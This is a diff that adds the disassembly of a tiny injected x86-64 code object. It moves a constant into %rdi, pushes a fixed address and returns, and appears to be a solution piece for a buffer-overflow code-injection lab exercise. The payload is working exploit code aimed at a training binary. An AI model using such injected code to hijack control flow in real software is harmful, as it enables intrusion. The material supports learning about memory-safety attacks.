@@ -1,0 +1,10 @@
+
+injection.o:	file format ELF64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 .text:
+       0: 48 c7 c7 a8 dc 61 55         	movq	$1432476840, %rdi
+       7: ff 34 25 fa 18 40 00         	pushq	4200698
+       e: c3                           	retq
